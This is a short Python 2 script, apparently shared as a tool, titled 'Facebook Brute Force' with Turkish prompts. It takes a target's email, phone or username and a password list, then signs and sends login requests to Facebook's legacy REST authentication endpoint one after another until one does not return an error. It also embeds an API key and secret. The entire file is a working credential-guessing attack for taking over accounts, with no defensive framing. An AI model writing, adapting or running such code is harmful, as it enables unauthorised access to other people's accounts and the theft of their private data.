## FBrutFor.py - Facebook Brute Force
# -*- coding: utf-8 -*-
#CyberFox
import os
import sys
import urllib
import hashlib

API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"

__banner__ = """
    
"""

print("[+] Facebook Brute Force Saldırısı \n")
userid = raw_input("[*] Enter [Eposta-Telefon-Kullanıcı_adı]: ")
try:
	passlist = raw_input("[*] Parola listesi: ")
	if os.path.exists(passlist) != False:
		print(__banner__)
		print(" [+] Deneme Yapılacak hesap : {}".format(userid))
		print(" [+] Yüklendi : {}".format(len(open(passlist,"r").read().split("\n"))))
		print(" [+] İşlem Başladı Lütfen Bekleyin ...")
		for passwd in open(passlist,'r').readlines():
			sys.stdout.write(u"\u001b[1000D[*] çalışıyor {}".format(passwd.strip()))
			sys.stdout.flush()
			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
			xx = hashlib.md5(sig).hexdigest()
			data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)
			response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
			if "error" in response:
				pass
			else:
				print("\n\n[+] Parola Bulundu... !!")
				print("\n[+] parola: {}".format(passwd.strip()))
				break
		print("\n\n[!] Tamam .. !!")
	else:
		print("FBrutFor: hata:")
except KeyboardInterrupt:
	print("fbbrute: Hata: Klavye sorunu:")
